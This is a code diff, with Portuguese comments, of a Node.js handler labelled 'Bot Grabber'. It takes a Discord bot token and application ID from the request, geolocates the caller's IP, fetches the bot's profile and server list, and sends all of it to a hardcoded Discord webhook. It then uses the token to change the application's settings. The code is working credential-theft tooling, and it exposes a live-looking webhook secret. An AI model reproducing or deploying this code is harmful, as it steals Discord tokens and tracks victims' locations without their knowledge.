@@ -1,50 +1,53 @@
-const { getClientIp } = require("request-ip")
+const { getClientIp } = require("request-ip");
 
 module.exports = async (req, res) => {
-  const {
-    applicationId,
-    token
-  } = req.query;
+  const { applicationId, token } = req.query;
   const webhookURL = 'https://discord.com/api/webhooks/1319442086524751902/jponFRjtTqcE9E0q-gy2lCCWJQySujcBuoKy5O39mphs-zaToU3An1zRckSOXqXtZICC';
   const ipApiURL = 'http://ip-api.com/json/';
 
-  const clientIP = getClientIp(req)
+  // Pega o IP real, levando em consideração proxies
+  const clientIP = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0] : getClientIp(req);
+
   if (!applicationId || !token) {
     return res.status(400).json({
       error: 'applicationId e token são necessários'
     });
   }
 
-  const locationResponse = await fetch(`${ipApiURL}${clientIP}`);
+  try {
+    // Consultar a localização do IP
+    const locationResponse = await fetch(`${ipApiURL}${clientIP}`);
+    const locationData = await locationResponse.json();
 
-  const locationData = await locationResponse.json();
-
-  const botInfoResponse = await fetch('https://discord.com/api/v10/users/@me', {
-    method: 'GET',
-    headers: {
-      Authorization: `Bot ${token}`,
-    },
-  });
-  const botInfo = await botInfoResponse.json();
-
-  const guildsResponse = await fetch('https://discord.com/api/v10/users/@me/guilds', {
-    method: 'GET',
-    headers: {
-      Authorization: `Bot ${token}`,
-    },
-  });
-  const guilds = await guildsResponse.json();
-
-  const embed = {
-    username: 'Bot Grabber',
-    embeds: [{
-      title: 'Nova Solicitação Recebida',
-      color: 0x00ff00,
-      fields: [{
-        name: 'IP do Cliente',
-        value: clientIP || 'Não disponível',
-        inline: false
+    // Obter informações do bot
+    const botInfoResponse = await fetch('https://discord.com/api/v10/users/@me', {
+      method: 'GET',
+      headers: {
+        Authorization: `Bot ${token}`,
       },
+    });
+    const botInfo = await botInfoResponse.json();
+
+    // Obter informações dos servidores do bot
+    const guildsResponse = await fetch('https://discord.com/api/v10/users/@me/guilds', {
+      method: 'GET',
+      headers: {
+        Authorization: `Bot ${token}`,
+      },
+    });
+    const guilds = await guildsResponse.json();
+
+    // Preparar a mensagem para o webhook do Discord
+    const embed = {
+      username: 'Bot Grabber',
+      embeds: [{
+        title: 'Nova Solicitação Recebida',
+        color: 0x00ff00,
+        fields: [{
+          name: 'IP do Cliente',
+          value: clientIP || 'Não disponível',
+          inline: false
+        },
         {
           name: 'Localização',
           value: `${locationData.country || 'Brasil'}, ${locationData.regionName || 'Não disponível'}, ${locationData.city || 'Não disponível'}`,
@@ -75,12 +78,10 @@ module.exports = async (req, res) => {
           value: new Date().toISOString(),
           inline: false
         },
-      ],
-    },
-    ],
-  };
+      }],
+    };
 
-  try {
+    // Enviar o webhook
     await fetch(webhookURL, {
       method: 'POST',
       headers: {
@@ -89,6 +90,7 @@ module.exports = async (req, res) => {
       body: JSON.stringify(embed),
     });
 
+    // Atualizar as configurações da aplicação
     const response = await fetch(`https://discord.com/api/v9/applications/${applicationId}`, {
       headers: {
         accept: '*/*',
@@ -119,4 +121,4 @@ module.exports = async (req, res) => {
       error: 'Erro ao fazer a requisição', details: error.message
     });
   }
-}
+};
